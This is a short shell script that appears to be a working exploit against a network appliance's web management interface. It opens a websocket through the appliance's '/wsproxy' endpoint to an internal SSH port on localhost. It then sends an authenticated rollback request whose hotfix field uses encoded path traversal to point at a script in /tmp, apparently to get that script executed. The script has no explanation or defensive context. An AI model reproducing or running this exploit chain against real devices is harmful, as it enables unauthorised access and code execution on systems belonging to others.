#!/bin/sh
appliance="$1"
admin_session="$2"
websocat "wss://$appliance/wsproxy?bmID=-3389a7d99&serviceType=SSH&host=::1&port=8188"
curl "https://$appliance:8443/rollbackConfirm.action" \
  -H "Cookie: JSESSIONID=$admin_session" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'command=rollback&hotfix=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftmp/other-name.sh&rollbackHotfixTime='
